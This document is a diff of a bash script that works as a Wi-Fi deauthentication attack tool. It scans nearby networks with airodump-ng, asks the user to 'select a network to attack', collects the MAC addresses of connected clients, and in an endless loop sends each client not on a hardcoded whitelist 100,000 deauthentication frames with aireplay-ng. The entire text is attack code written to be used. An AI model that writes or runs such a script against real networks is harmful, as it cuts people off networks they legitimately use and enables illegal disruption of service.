@@ -1,39 +1,65 @@
 #!/bin/bash
 echo 'Your network interface name?'
 read interface
-# airmon-ng start $interface
-# airodump-ng $interface
+# # airmon-ng start $interface
+# # airodump-ng $interface
 
+ud="users-01.csv"
+
+if [ -e "$ud" ]; then
+  rm "$ud"
+fi
 sudo xterm -title "Deauth scanner" -e airodump-ng -w out --output-format csv $interface
 
 
-bssids=($(grep -v 'BSSID' out-01.csv | awk '{print $1}'))
-essids=($(grep -v 'BSSID' out-01.csv | awk '{print $4}'))
+options=()
 
+while read -r line; do
+    options+=("$line")
+done < <(awk -F "," 'NR>2 && !/Station MAC/ {print $1, $14} /Station MAC/ {exit}' out-01.csv)
+
+PS3="Select a network to attack: "
+select choice in "${options[@]}"; do
+    if [ -n "$choice" ]; then
+        bande=$choice
+        break
+    else
+        echo "Invalid option. Please try again."
+    fi
+done
+bssid=$(echo "$bande" | awk '{print $1}')
+# echo $bssid
 rm out-01.csv
 
-echo "Available Wi-Fi Networks:"
-select network in "${essids[@]}"; do
-  bssid=${bssids[REPLY-1]}
-  break
-done
 
-mac=$(ifconfig "$interface" | awk '/ether/ {print $2}')
 
-WHITELIST=($mac)
+WHITELIST=("6A:04:8E:78:30:35" "4A:05:8E:78:30:32")
+
+
+
+
+
+xterm -title "Users monitor" -e  airodump-ng --bssid "$bssid" -w users --output-format csv $interface &
+
+sleep 2
+
+
 
 while true; do
-  DEVICES=($(arp -i $INTERFACE -n | tail -n +2 | cut -f 3 -d ' '))
+    macs=($(awk -F "," 'NR>5 {print $1}' users-01.csv))
+    for mac in "${macs[@]}"; do
+        skip=0
+        for white in "${WHITELIST[@]}"; do
+            if [ "$mac" == "$white" ]; then
+                skip=1
+                break
+            fi
+        done
+        [ "$skip" -eq 1 ] && continue
 
-  for DEVICE in "${DEVICES[@]}"; do
-    skip=
-    for MAC in "${WHITELIST[@]}"; do
-        if [ "$DEVICE" == "$MAC" ]
-        then
-            skip=1; 
-        fi
+        xterm -title "Aireplay-ng for $mac" -e \
+            iwconfig wlan0 channel 6 && \
+            sudo aireplay-ng --deauth 100000 -a "$bssid" -c "$mac" "$interface" &
     done
-    [ -n "$skip" ] && continue
-    aireplay-ng -0 1 -a "$bssid" -c "$DEVICE" "$interface"
-  done
+    sleep 5  # Adjust the sleep duration based on your requirements
 done
